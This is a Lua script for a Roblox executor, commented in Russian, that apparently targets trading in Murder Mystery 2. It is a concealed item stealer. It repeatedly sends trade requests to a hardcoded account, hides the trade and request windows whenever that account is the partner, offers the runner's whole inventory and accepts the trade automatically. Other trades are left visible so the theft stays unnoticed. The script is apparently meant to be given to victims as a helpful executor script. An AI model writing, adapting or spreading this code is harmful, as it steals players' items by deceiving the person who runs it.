-- [! DELTA EXECUTOR MOBILE OPTIMIZED !]
-- Архитектура: Асинхронный UI-перехватчик и автоматизатор ремоутов

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RunService = game:GetService("RunService")

local LocalPlayer = Players.LocalPlayer
local TargetPlayerName = "ilyes_ida3"

-- Кеширование путей для стабильности
local TradeFolder = ReplicatedStorage:WaitForChild("Trade", 10)
local PlayerData = ReplicatedStorage:WaitForChild("PlayerData", 10)

-------------------------------------------------------------------------------
-- БЛОК 1: АГРЕССИВНЫЙ СКАНЕР СЕРВЕРА (Интервал 3 секунды)
-------------------------------------------------------------------------------
task.spawn(function()
    while task.wait(3) do
        local target = Players:FindFirstChild(TargetPlayerName)
        if target and TradeFolder then
            pcall(function()
                -- Кидаем инвоук на старт трейда. Ошибки гасятся через pcall.
                TradeFolder.SendRequest:InvokeServer(target)
            end)
        end
    end
end)

-------------------------------------------------------------------------------
-- БЛОК 2: АВТОМАТИЧЕСКИЙ ДАМП ИНВЕНТАРЯ И ПОДТВЕРЖДЕНИЕ
-------------------------------------------------------------------------------
local function ExecuteTradeDump()
    task.spawn(function()
        -- Даем серверу прогрузить сессию трейда
        task.wait(0.5) 
        
        local myData = PlayerData and PlayerData:FindFirstChild(LocalPlayer.Name)
        if myData then
            local inventory = myData:FindFirstChild("Inventory")
            if inventory then
                -- Прочесываем все категории (Weapons, Pets, Misc)
                for _, category in pairs(inventory:GetChildren()) do
                    for _, item in pairs(category:GetChildren()) do
                        pcall(function()
                            -- Закидываем предмет в трейд-окно
                            TradeFolder.OfferItem:FireServer(item.Name, category.Name)
                        end)
                        -- Микро-делей чтобы Delta не захлебнулась и сервер не кикнул за спам пакетами
                        task.wait(0.05)
                    end
                end
            end
        end
        
        -- Ждем синхронизации предметов на стороне сервера
        task.wait(1.5)
        
        -- Финальное подтверждение
        pcall(function()
            TradeFolder.AcceptTrade:FireServer()
        end)
    end)
end

-------------------------------------------------------------------------------
-- БЛОК 3: ПЕРЕХВАТЧИК ИНТЕРФЕЙСА (100% СКРЫТИЕ -> АНАЛИЗ -> ВОЗВРАТ)
-------------------------------------------------------------------------------
local function HookTradeUI(uiObject)
    -- Определяем тип свойства в зависимости от класса UI
    local isScreenGui = uiObject:IsA("ScreenGui")
    local property = isScreenGui and "Enabled" or "Visible"
    
    uiObject:GetPropertyChangedSignal(property):Connect(function()
        if uiObject[property] == true then
            -- [СТАДИЯ 1]: 100% ПРИНУДИТЕЛЬНОЕ СКРЫТИЕ
            uiObject[property] = false
            
            -- [СТАДИЯ 2]: АНАЛИЗ ОППОНЕНТА
            -- Ждем 0.15с, чтобы локальный скрипт игры успел обновить TextLabel именами
            task.wait(0.15)
            
            local opponentFound = false
            local isTarget = false
            
            -- Рекурсивно сканируем интерфейс на наличие имен игроков
            for _, element in pairs(uiObject:GetDescendants()) do
                if element:IsA("TextLabel") or element:IsA("TextBox") then
                    local text = element.Text
                    -- Ищем реального игрока на сервере, исключая себя
                    if Players:FindFirstChild(text) and text ~= LocalPlayer.Name then
                        opponentFound = true
                        if text == TargetPlayerName then
                            isTarget = true
                        end
                        break -- Оппонент идентифицирован, стопаем поиск
                    end
                end
            end
            
            -- [СТАДИЯ 3]: ИСПОЛНЕНИЕ ЛОГИКИ
            if isTarget then
                -- Если это ilyes_ida3: GUI остается скрытым. Запускаем дамп.
                ExecuteTradeDump()
            else
                -- Если это ЛЮБОЙ ДРУГОЙ ИГРОК: Откатываем скрытие, возвращаем штатную работу.
                if opponentFound then
                    uiObject[property] = true
                else
                    -- Защита от сбоя: если имя не успело прогрузиться в UI, все равно возвращаем GUI, 
                    -- чтобы не сломать игру обычному пользователю.
                    uiObject[property] = true
                end
            end
        end
    end)
end

-------------------------------------------------------------------------------
-- БЛОК 4: ИНИЦИАЛИЗАЦИЯ И СЛУШАТЕЛЬ НОВЫХ UI
-------------------------------------------------------------------------------
local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")

-- Сканируем уже существующие элементы (MainGUI содержит Trade в MM2)
for _, gui in pairs(PlayerGui:GetChildren()) do
    if gui.Name == "TradeGUI" or gui.Name == "MainGUI" then
        -- Если это MainGUI, ищем внутри него фреймы трейда
        local tradeFrame = gui:FindFirstChild("Trade") or gui:FindFirstChild("TradeGUI", true)
        if tradeFrame then
            HookTradeUI(tradeFrame)
        else
            HookTradeUI(gui)
        end
    end
end

-- Слушаем появление новых интерфейсов (если игра спавнит их динамически)
PlayerGui.ChildAdded:Connect(function(gui)
    if gui.Name:match("Trade") or gui.Name == "MainGUI" then
        task.wait(0.1) -- Ждем рендера внутренностей
        local tradeFrame = gui:FindFirstChild("Trade") or gui:FindFirstChild("TradeGUI", true)
        if tradeFrame then
            HookTradeUI(tradeFrame)
        else
            HookTradeUI(gui)
        end
    end
end)

-------------------------------------------------------------------------------
-- БЛОК 5: АВТО-ПРИНЯТИЕ ВХОДЯЩИХ ЗАПРОСОВ (ТОЛЬКО ОТ ilyes_ida3)
-------------------------------------------------------------------------------
-- В MM2 входящие запросы вешают UI или кидают эвент. 
-- Хукаем прямое появление реквеста через PlayerGui.
PlayerGui.DescendantAdded:Connect(function(descendant)
    if descendant:IsA("TextLabel") and descendant.Text:match("Trade Request") then
        local parentFrame = descendant.Parent
        if parentFrame then
            task.wait(0.1)
            -- Проверяем, есть ли в этом окне имя нашего таргета
            local hasTarget = false
            for _, elem in pairs(parentFrame:GetDescendants()) do
                if elem:IsA("TextLabel") and elem.Text == TargetPlayerName then
                    hasTarget = true
                    break
                end
            end
            
            if hasTarget then
                -- Скрываем окно реквеста
                if parentFrame:IsA("Frame") or parentFrame:IsA("ScreenGui") then
                    pcall(function() parentFrame.Visible = false end)
                end
                -- Отправляем Accept
                local targetObj = Players:FindFirstChild(TargetPlayerName)
                if targetObj and TradeFolder then
                    pcall(function()
                        TradeFolder.AcceptRequest:FireServer(targetObj)
                    end)
                end
            end
        end
    end
end)
